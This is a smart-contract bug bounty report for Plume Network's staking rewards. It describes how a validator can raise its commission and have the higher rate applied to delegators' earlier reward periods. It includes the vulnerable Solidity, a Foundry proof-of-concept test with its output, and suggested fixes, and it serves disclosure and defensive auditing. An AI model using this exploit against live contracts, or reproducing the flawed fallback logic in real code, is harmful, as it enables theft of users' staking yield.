# 51987 sc high validators will be able to steal more commission from users that isn t the commission to be charged

**Submitted on Aug 7th 2025 at 04:01:22 UTC by @oxrex for** [**Attackathon | Plume Network**](https://immunefi.com/audit-competition/plume-network-attackathon)

* **Report ID:** #51987
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/attackathon-plume-network/blob/main/plume/src/lib/PlumeRewardLogic.sol>
* **Impacts:** Theft of unclaimed yield

## Description

Validators can cause users to be charged a commission rate that is higher than the rate that should apply for a given historical period. Due to how commission checkpoints and fallback logic are implemented, a validator can set a new commission and immediately benefit from that new (higher) rate when computing commissions for prior user reward intervals, causing theft of unclaimed yield.

## Vulnerability Details

Below are the two relevant functions involved in selecting the commission rate for a timestamp and falling back to the validator's current commission:

```solidity
function findCommissionCheckpointIndexAtOrBefore(
        PlumeStakingStorage.Layout storage $,
        uint16 validatorId,
        uint256 timestamp
    ) internal view returns (uint256) {
        PlumeStakingStorage.RateCheckpoint[] storage checkpoints = $.validatorCommissionCheckpoints[validatorId];
        uint256 len = checkpoints.length;
        if (len == 0) {
            return 0; // No checkpoints, caller uses current validator.commission
        }

        uint256 low = 0;
        uint256 high = len - 1;
        uint256 ans = 0;
        bool foundSuitable = false;

        while (low <= high) {
            uint256 mid = low + (high - low) / 2;

            if (checkpoints[mid].timestamp <= timestamp) {
                ans = mid;
                foundSuitable = true;
                low = mid + 1;
            } else {
                if (mid == 0) {
                    break;
                }
                high = mid - 1;
            }
        }
        return ans;
    }
```

```solidity
function getEffectiveCommissionRateAt(
        PlumeStakingStorage.Layout storage $,
        uint16 validatorId,
        uint256 timestamp
    ) internal view returns (uint256) {
        PlumeStakingStorage.RateCheckpoint[] storage checkpoints = $.validatorCommissionCheckpoints[validatorId];
        uint256 chkCount = checkpoints.length;

        if (chkCount > 0) {
            uint256 idx = findCommissionCheckpointIndexAtOrBefore($, validatorId, timestamp);
            if (idx < chkCount && checkpoints[idx].timestamp <= timestamp) {
                // Similar to above, ensure this is the latest one.
                return checkpoints[idx].rate;
            }
        }
        // Fallback to the current commission rate stored directly in ValidatorInfo
        // This is important if no checkpoints exist or all are in the future.
        uint256 fallbackComm = $.validators[validatorId].commission;
        return fallbackComm;
    }
```

Briefly, how these functions are used:

{% stepper %}
{% step %}

### Review of getEffectiveCommissionRateAt() usage

* `getEffectiveCommissionRateAt()` calls `findCommissionCheckpointIndexAtOrBefore()` to obtain a commission rate to use when computing how much of gross reward is paid to a validator.
  {% endstep %}

{% step %}

### Behavior of findCommissionCheckpointIndexAtOrBefore()

* It returns an index of a commission checkpoint with timestamp at or before the provided `timestamp`. If none are at or before, it returns 0 (and the caller checks if the checkpoint at index 0 is actually <= timestamp).
  {% endstep %}

{% step %}

### Fallback logic issue

* If the index returned does not point to a checkpoint with timestamp <= `timestamp`, `getEffectiveCommissionRateAt()` falls back to the current validator commission stored in `$.validators[validatorId].commission`. That current commission may have been updated at the present block.timestamp when a validator called `setValidatorCommission()`.
  {% endstep %}
  {% endstepper %}

The problem arises because `setValidatorCommission()` sets the validator's current commission immediately (used as fallback) and then creates the checkpoint with the same effective timestamp. This allows a newly set commission to be used as fallback for queries about earlier timestamps when the binary search returns an index that doesn't satisfy the timestamp check.

Example snippet from `setValidatorCommission()`:

```solidity
function setValidatorCommission(
        uint16 validatorId,
        uint256 newCommission
    ) external onlyValidatorAdmin(validatorId) {
        ...

        // Now update the validator's commission rate to the new rate.
        validator.commission = newCommission;

        // Create a checkpoint for the new commission rate.
        // This records the new rate effective from this block.timestamp.
        ...
    }
```

A more concrete flow of the logic that the contract intended:

{% stepper %}
{% step %}

* At t0 validator commission: 5e16
* At t1 user stakes
  {% endstep %}

{% step %}

* At t2 validator updates to 5.5e16 (checkpoint at t2)
* If user claims now, the segment covering \[t1, t2) should use 5e16
  {% endstep %}

{% step %}

* At t3 validator updates to 5.8e16 (checkpoint at t3)
* Next segment \[t2, t3) should use 5.5e16
  {% endstep %}

{% step %}

* At t4 validator updates to 6e16 (checkpoint at t4)
* Next segment \[t3, t4) should use 5.8e16
  {% endstep %}
  {% endstepper %}

However, due to the fallback logic described above, when calculating commission for the earliest segment \[t1, t2) the system may instead apply the current commission (6e16) immediately, reversing and corrupting the intended historical sequence.

### Where the wrong commission is applied in reward calculation

Relevant snippet from reward calculation where commission is determined for each time segment:

```solidity
// inside _calculateRewardsCore(...)
uint256[] memory distinctTimestamps =
    getDistinctTimestamps($, validatorId, token, lastUserRewardUpdateTime, effectiveEndTime);

for (uint256 k = 0; k < distinctTimestamps.length - 1; ++k) {
    ...
    // Commission rate effective at the START of this segment
    uint256 effectiveCommissionRate = getEffectiveCommissionRateAt($, validatorId, segmentStartTime);

    // Use ceiling division for commission charged to user to ensure rounding up
    uint256 commissionForThisSegment =
        _ceilDiv(grossRewardForSegment * effectiveCommissionRate, PlumeStakingStorage.REWARD_PRECISION);

    ...
    totalCommissionAmountDelta += commissionForThisSegment;
}
```

Because `segmentStartTime` can be earlier than the earliest checkpoint timestamp and `findCommissionCheckpointIndexAtOrBefore()` returns 0 (which doesn't satisfy the checkpoint timestamp <= segmentStartTime check), `getEffectiveCommissionRateAt()` falls back to `$.validators[validatorId].commission` — which may have been set to a later/higher rate — causing overcharging.

## Impact Details

Validators can extract excessive commission from delegators by repeatedly setting higher commission rates. A validator who increases commission shortly after delegations can cause the delegators' historical reward segments to be calculated using the new higher commission immediately (via the fallback), rather than the commission that was effective during the original segment. This enables stealing a portion of rewards — the larger the delegated stakes, the larger the stolen amount.

Example attack scenario:

* Validator sets modest increases several times and then sets a very large commission (e.g., near the 50% cap).
* Delegators who claim rewards for prior periods may end up being charged the large commission for earlier intervals, not the historically correct lower rates.

## Suggested Mitigation

One approach suggested by the reporter:

* Ensure the first commission rate for a validator is pushed into `validatorCommissionCheckpoints` during `addValidator()` (similar to how global reward rate is checkpointed) so that there is always an initial checkpoint to be found by the binary search instead of falling back to `validator.commission`.
* Alternatively, modify the `getEffectiveCommissionRateAt()` / `findCommissionCheckpointIndexAtOrBefore()` logic so that it cannot fall back to the current `validator.commission` if there exist checkpoints but none with timestamp <= requested timestamp. Instead, return the earliest checkpoint rate (or otherwise ensure the correct historical rate is used).

Note: Do not change any external behavior beyond preserving the invariant that historical segments must use the commission rate that was effective at that time.

## References

* <https://github.com/immunefi-team/attackathon-plume-network/blob/main/plume/src/lib/PlumeRewardLogic.sol#L675-L706>
* <https://github.com/immunefi-team/attackathon-plume-network/blob/main/plume/src/lib/PlumeRewardLogic.sol#L605-L624>
* <https://github.com/immunefi-team/attackathon-plume-network/blob/main/plume/src/lib/PlumeRewardLogic.sol#L212-L360>
* <https://github.com/immunefi-team/attackathon-plume-network/blob/main/plume/src/facets/ValidatorFacet.sol#L317-L352>

## Proof of Concept

<details>

<summary>Proof-of-Concept test (expand)</summary>

```solidity
function testStealMoreCommissionsFromUsers()
        public
    {

        uint256 startTimestamp = block.timestamp;

        ValidatorFacet validatorFacet = ValidatorFacet(address(diamondProxy));
        StakingFacet stakingFacet = StakingFacet(address(diamondProxy));
        RewardsFacet rewardsFacet = RewardsFacet(address(diamondProxy));
        uint16 validatorAlice = 2;

        vm.startPrank(admin);
        _addValidator(validatorAlice, 5e16, charlie, charlie);
        vm.stopPrank();

        // User stakes
        address staker = makeAddr("staker");
        vm.deal(staker, 100 ether);
        vm.startPrank(staker);
        startTimestamp += 10;
        vm.warp(startTimestamp);
        stakingFacet.stake{value: 100 ether}(validatorAlice);
        vm.stopPrank();

        vm.prank(charlie);
        startTimestamp += 86400;
        vm.warp(startTimestamp);
        validatorFacet.setValidatorCommission(validatorAlice, 5.5e16);

        vm.prank(charlie);
        startTimestamp += 86400;
        vm.warp(startTimestamp);
        validatorFacet.setValidatorCommission(validatorAlice, 5.8e16);

        vm.prank(charlie);
        startTimestamp += 86400;
        vm.warp(startTimestamp);
        validatorFacet.setValidatorCommission(validatorAlice, 6e16);

        vm.startPrank(staker);
        rewardsFacet.claim(PLUME_NATIVE, validatorAlice);
        vm.stopPrank();

        console2.log("Earned PLUME REWARDS: ", staker.balance);
    }
```

You can add `console2.log` statements in `_calculateRewardsCore` to see the commission rates used:

```diff
+ console2.log("comissionRateUsed: ", effectiveCommissionRate);

                // Use ceiling division for commission charged to user to ensure rounding up
                uint256 commissionForThisSegment =
                    _ceilDiv(grossRewardForSegment * effectiveCommissionRate, PlumeStakingStorage.REWARD_PRECISION);

+               console2.log("Commission for this segment: ", commissionForThisSegment);
```

Console.log output from the reporter:

```
comissionRateUsed:  60000000000000000
Commission for this segment:  822952380796020
comissionRateUsed:  55000000000000000
Commission for this segment:  1508658729872085
comissionRateUsed:  58000000000000000
Commission for this segment:  2386377777324366
comissionRateUsed:  60000000000000000
Commission for this segment:  518460000000000000000
comissionRateUsed:  55000000000000000
Commission for this segment:  950455000000000000000
comissionRateUsed:  58000000000000000
Commission for this segment:  1503418000000000000000
Earned PLUME REWARDS:  77572487286848529
```

</details>

\-- End of report.
